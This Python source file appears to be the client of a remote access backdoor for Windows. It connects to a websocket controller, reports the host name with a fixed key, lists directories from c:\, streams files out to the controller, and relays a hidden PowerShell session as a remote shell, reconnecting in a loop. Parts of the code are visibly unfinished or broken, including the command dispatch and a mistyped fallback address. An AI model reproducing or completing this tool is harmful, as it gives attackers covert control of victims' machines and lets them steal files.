from websocket import WebSocket
from platform import node
from time import sleep
import os
import subprocess
from websocket import WebSocket
from platform import node

op = os.path
funcMap = {}
# CREATE A FUNCTION MAP FOR COMMANDS AND FUNCTIONS, MAKE A FUNCTION TO ADD FUNCTIONS EASILY TO THE MAP
def addToFunctionMap(CMDname, desc, callback):
    global funcMap
    funcMap[CMDname] = [desc, callback]

def getAllCommands(websocket):
    for cmd in funcMap:
        websocket.send(f"{cmd}: {cmd[0]}")
    endOfTransmission(websocket)

# Connect to controller
def connect(ip):
    ws = WebSocket()
    ws.connect(f"ws://{ip}:8765")
    ws.send(f"CONNECT: {node()} KEY: OmG") # Include machine name and a key
    res = ws.recv()
    # Retry every few mins instead of quitting
    if res == "SUCCESS":
        return ws
    else:
        return False

# Map directory
def mapDirectory(path, recursive=False):
    if path == None: path = "c:\\"

    try:
        listing = os.listdir(path)
    except FileNotFoundError:
        return "Directory not found!"
    
    dirMap = {}

    for item in listing:
        fullItemPath = op.join(path, item)

        if op.isdir(fullItemPath):
            if recursive:
                dirMap[item] = mapDirectory(fullItemPath, True)
            else:
                dirMap[item] = {}
        elif op.isfile(fullItemPath):
            dirMap[item] = 1
        else:
            dirMap[item] = 2
    
    return dirMap

# Upload file
def uploadFile(websocket, path, readSize=16000000):
    if not os.path.exists(path): return False
    # send size of file so that server can tell when data stream is done
    with open(path, "rb") as f:
        d = f.read(16000000)
        while d:
            websocket.send(d)
            d = f.read(readSize)
    
    print("File sent!")

# Powershell spawn
def spawnPowerShell(websocket):
    # take websocket argument to pass and recv commands
    ps = subprocess.Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    ps.stdin.write(f"Write-Host 'ENDOFOUTPUT9'\n")
    ps.stdin.flush()

    while True:
        line = ps.stdout.readline()
        if "ENDOFOUTPUT9" in line and "Write-Host" not in line:
            break

    def readWriteSTD(powershellInstance, command):
        # NEED TO WATCH FOR ERRORS, STDERR NOT STUPPORTED YET
        powershellInstance.stdin.write(f"{command}; Write-Host 'ENDOFOUTPUT9'\n")
        powershellInstance.stdin.flush()

        output = []
        while True:
            line = powershellInstance.stdout.readline().strip()
            if "ENDOFOUTPUT9" in line and "Write-Host" not in line: # NEED A BETTER END OF OUTPUT, USE \N OR SOMETHING
                break
            else:
                output.append(line)
        return output

    directory = ""
    while True:
        websocket.send(f"PS{directory}> ")
        cmd = websocket.recv()

        if cmd.lower() == "exit": break

        output = readWriteSTD(ps, cmd)
        
        # Send entire table instead of single line at a time
        for line in output:
            if "PS C:\\" in line and f"> {cmd}" in line:
                directory = " " + line.split("PS C:\\")[1].split(f"> {cmd}")[0]
            elif line:
                websocket.send(line)

    ps.stdin.close()
    ps.terminate()

def endOfTransmission(websocket):
    websocket.send("\n\n\n\n\nEND")

# Get all functions
funcs = [f for f in globals().values() if callable(f)]
for f in funcs:
    addToFunctionMap(f.__name__, "", f) # Could get rid of this and just use funcs, it contains name sooooo

# Get connected
ws = connect("127.0.0.1")
while not ws:
    ws = connect("172.0.0.1")
    sleep(10)

while True:
    res = ws.recv()
    print("Received:", res)
    if res == "cmds":
        getAllCommands(ws)
    elif res in funcMap:
        s = res.split(">")[0].split()
        print(s[0], s[1:])
        funcMap[s[0]](s[1:])
    else:
        ws.send("Command does not exist!")
        endOfTransmission(ws)
        